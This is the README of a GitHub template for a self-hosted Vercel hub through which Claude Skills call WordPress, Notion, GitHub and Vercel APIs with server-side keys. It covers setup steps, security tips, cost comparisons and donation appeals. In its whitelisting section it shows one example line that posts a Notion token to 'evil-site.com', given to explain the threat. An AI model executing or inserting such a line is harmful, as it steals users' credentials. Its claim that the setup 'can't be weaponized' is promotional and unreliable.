# 🚀 Skills Hub Template

**One-click deployable API connector hub for Claude**

> **TL;DR:** Host YOUR OWN hub. Your API keys stay server-side. Network whitelisting prevents abuse. Can't be weaponized. Free alternative to Make.com/Zapier.

---

## 🍺 Buy Me a Drink (But Seriously Though)

If this saves you money on Make.com/Zapier subscriptions, consider helping fund more open-source AI development!

**Goal:** If a million of you send me a dollar, I can finally afford that Brazilian butt lift and liposuction I've been dreaming about. 😂

But actually - every donation helps me:
- Keep building free tools for the AI community
- Run faster servers for development
- Stay off the streets (3 months behind on mortgage, send help!)

**[☕ Buy Me a Drink](https://buymeacoffee.com/willcureton)** *(or fund my cosmetic surgery dreams)*

---

## 🎯 What This Solves

**The Problem:** Sharing Claude Skills with embedded API keys is a security nightmare. Malicious Skills can steal your tokens.

**The Solution:** Everyone hosts their OWN hub with:
- ✅ API keys server-side (never touch Claude)
- ✅ Network whitelisting (only YOUR hub URL)
- ✅ You control everything
- ✅ Can't be weaponized

**Result:** Make.com and Zapier are now optional. Free API orchestration.

---

## ⚡ Quick Setup (5 Minutes)

### Step 1: Deploy to Vercel

[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/WillCureton76/skills-hub-template)

### Step 2: Add Environment Variables

When prompted:

```
WORDPRESS_URL=https://your-site.com
WORDPRESS_USERNAME=your-email@example.com
WORDPRESS_PASSWORD=your-app-password

NOTION_TOKEN=secret_xxxxxxxxxxxxx

GITHUB_TOKEN=ghp_xxxxxxxxxxxxx

VERCEL_TOKEN=xxxxxxxxxxxxx
```

### Step 3: Get Your Hub URL

After deployment: `https://your-hub-abc123.vercel.app`

### Step 4: Download Router Skill

Download [skill-router.md](./skill-router.md) and edit:

```python
HUB_URL = "https://your-hub-abc123.vercel.app"
```

### Step 5: Upload to Claude

Upload the edited `skill-router.md` to Claude Skills.

**Done!** Claude can now call your hub securely.

---

## 🔒 Critical Security Guidelines

### ✅ DO THIS

- **Host your own hub** - Never use someone else's
- **Whitelist your hub URL** - Claude Settings → Network → Add your-hub.vercel.app
- **Use scoped tokens** - Minimum permissions needed
- **Rotate tokens regularly** - Every 3-6 months
- **Review hub code** - Inspect what you're deploying
- **Use environment variables** - Never commit tokens to Git

### ❌ DON'T DO THIS

- **Never share your hub URL publicly** - It's YOUR infrastructure
- **Never use someone else's hub** - They can steal your API calls
- **Never disable network whitelisting** - That's your main security
- **Never commit API keys to GitHub** - Use Vercel env vars only
- **Never trust random Skills** - They might call malicious hubs
- **Never skip code review** - Know what you're running

### 🚨 Why Network Whitelisting Matters

Without whitelisting, a malicious Skill could:
```python
# Steal your Notion token
requests.post("https://evil-site.com/steal", json={"token": NOTION_TOKEN})
```

With whitelisting to ONLY your hub:
- ✅ Malicious Skills can't reach evil-site.com
- ✅ Only YOUR hub URL works
- ✅ Data exfiltration blocked

**This is your primary defense. Don't skip it.**

---

## 📚 Available Skills (22 Functions)

### WordPress (5)
- `wordpress_create_post` - Create posts
- `wordpress_get_posts` - Get posts  
- `wordpress_update_post` - Update posts
- `wordpress_delete_post` - Delete posts
- `wordpress_upload_media` - Upload media

### Notion (5)
- `notion_query_database` - Query databases
- `notion_create_page` - Create pages
- `notion_update_page` - Update pages
- `notion_get_page` - Get page details
- `notion_append_blocks` - Add content to pages

### GitHub (7)
- `github_list_repos` - List repositories
- `github_create_repo` - Create repositories
- `github_get_repo` - Get repo details
- `github_create_file` - Create files
- `github_update_file` - Update files
- `github_create_issue` - Create issues
- `github_list_issues` - List issues

### Vercel (5)
- `vercel_list_projects` - List projects
- `vercel_create_project` - Create projects
- `vercel_create_env_var` - Add environment variables
- `vercel_list_env_vars` - List environment variables
- `vercel_list_deployments` - List deployments

---

## 🧪 Testing Your Hub

```bash
# Health check
curl https://your-hub.vercel.app/

# Test a skill
curl -X POST https://your-hub.vercel.app/skill-call \
  -H "Content-Type: application/json" \
  -d '{
    "skill": "github_list_repos",
    "params": {"per_page": 5}
  }'
```

---

## 🛠️ How It Works

### Hub (Vercel)
```python
@app.post("/skill-call")
async def skill_call(request):
    payload = await request.json()
    skill = payload["skill"]
    params = payload["params"]
    
    # Route to function
    result = SKILLS[skill](**params)
    return result
```

### Router Skill (Claude)
```python
HUB_URL = "https://your-hub.vercel.app"

def call_skill(skill, **params):
    return requests.post(
        f"{HUB_URL}/skill-call",
        json={"skill": skill, "params": params}
    ).json()
```

**That's it.** Simple HTTP. No MCP complexity.

---

## 💰 Why This Matters (You'll Save Money)

**Make.com pricing:**
- Core: $10.59/month (10,000 operations)
- Pro: $18.82/month (40,000 operations)
- Teams: $34.12/month (80,000 operations)

**Zapier pricing:**
- Starter: $29.99/month (750 tasks)
- Professional: $73.50/month (2,000 tasks)
- Team: $103.50/month (50,000 tasks)

**This template:**
- Vercel: FREE (Hobby plan handles most use cases)
- Your time: 5 minutes setup
- Cost: $0/month

**You're welcome.** 🎉

---

## 🎓 The Discovery: Skills as MCP Alternative

This template is based on the "Skills as MCP Alternative" discovery:

**What we found:**
- Claude Skills + Python + network access = instant API connector
- No MCP server infrastructure needed
- Same functionality, zero complexity
- Works across all conversations

**The breakthrough:**
Instead of building MCP servers (Docker, TypeScript, protocols), just:
1. Write Python code
2. Put it in markdown
3. Upload to Skills
4. Done

**But there's a security problem:** Sharing Skills with API keys is risky.

**The solution (this template):** Everyone hosts their own hub. Keys stay server-side. Problem solved.

---

## 🔧 Customization

### Adding New Skills

1. Create `skills/newapi.py`
2. Add functions for your API
3. Import in `api/index.py`
4. Add to `SKILLS` dictionary
5. Redeploy

### Example: Adding Slack

```python
# skills/slack.py
import os
import requests

SLACK_TOKEN = os.environ.get("SLACK_TOKEN")

def post_message(channel, text):
    requests.post(
        "https://slack.com/api/chat.postMessage",
        headers={"Authorization": f"Bearer {SLACK_TOKEN}"},
        json={"channel": channel, "text": text}
    )
    return {"success": True}
```

```python
# api/index.py
from skills import slack

SKILLS = {
    ...
    "slack_post_message": slack.post_message,
}
```

Deploy. Done.

---

## 🚨 Troubleshooting

### "Could not connect to hub"
- ✅ Check HUB_URL is correct
- ✅ Verify Vercel deployment is live
- ✅ Check network whitelist includes your hub

### "Hub returned error 500"
- ✅ Check environment variables in Vercel
- ✅ View deployment logs
- ✅ Verify API tokens are valid

### "Skill not found"
- ✅ Check skill name spelling
- ✅ Visit hub URL to see available skills

---

## 📖 Learn More

**Skills Discovery:**
- Original concept: Skills + Python + network = API connector
- Problem: Sharing is risky (API key theft)
- Solution: Personal hub architecture

**Architecture:**
- Designed via 3-way AI hive mind (Claude Opus, Sonnet, GPT-5.1)
- GPT-5.1's recommendation: "Skip MCP. Just HTTP. Works forever."
- Result: Simplest possible solution

**Future Additions:**
- Pinecone (vector database)
- Monday.com (project management)
- Copilot Navigation (GPS/location)
- OpenAI/Anthropic Streaming (AI-to-AI)

---

## 🙏 Credits & Support

**Created by:** Will Cureton  
**Date:** November 19, 2025  
**Inspiration:** Making AI workflows accessible without vendor lock-in

**If this saves you money:**  
[☕ Buy Me a Drink](https://buymeacoffee.com/willcureton) (Brazilian butt lift fund)

**Having issues?**  
Open an issue on GitHub

---

## 📜 License

MIT License - Fork it, customize it, share it!

Just remember: Everyone should host their own hub for security.

---

## 🎯 Final Thoughts

You just saved yourself $120-300/year by not paying for Make.com or Zapier.

If everyone who uses this sends me $1, I can afford that Brazilian butt lift. No pressure though.

But seriously - this is free, open-source, and secure. Enjoy! 🎉

---

**Star this repo if it helped you!** ⭐
